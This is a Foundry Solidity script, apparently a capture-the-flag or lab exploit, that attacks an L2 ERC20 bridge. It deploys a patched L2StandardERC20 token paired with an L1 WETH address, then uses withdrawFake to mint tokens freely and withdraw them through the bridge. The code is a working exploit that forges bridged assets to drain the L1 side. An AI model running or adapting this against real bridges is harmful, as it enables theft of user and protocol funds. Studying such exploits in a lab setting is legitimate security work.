pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

import "src/L2/L2CrossDomainMessenger.sol";
import "src/L2/L2ERC20Bridge.sol";
import "src/L2/standards/L2StandardERC20.sol"; // make sure to patch this!

contract Deploy is Script {
    L2ERC20Bridge l2;
    L2CrossDomainMessenger m2;

    function setUp() public {
        l2 = L2ERC20Bridge(0x420000000000000000000000000000000000baBe);
        m2 = L2CrossDomainMessenger(l2.messenger());
    }

    function run() public {
        // 2. create with weth contract on l1
        // createToken(address(0xDB61AfFB647Be363aA792929F6aC9C31684D4285));
        // 4. withdraw
        // withdrawDefault();
        // withdrawFake(address(0xAe5c6BBE63022b4e4A94E33f53B15383364dDc0f));
    }

    function withdrawDefault() public {
        vm.startBroadcast();
        l2.withdraw(address(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000), 2 ether);
        vm.stopBroadcast();
    }

    function withdrawFake(address l2token) public {
        vm.startBroadcast();
        L2StandardERC20 asd = L2StandardERC20(l2token);
        asd.mint(address(this), 2 ether);
        asd.mint(msg.sender, 2 ether);
        l2.withdraw(address(l2token), 2 ether);
        vm.stopBroadcast();
    }
        
    function createToken(address l1Pair) public {
        vm.startBroadcast();
        address newToken = address(new L2StandardERC20(l1Pair, "kek", "kek"));
        vm.stopBroadcast();
        console.logAddress(newToken);
    }
}
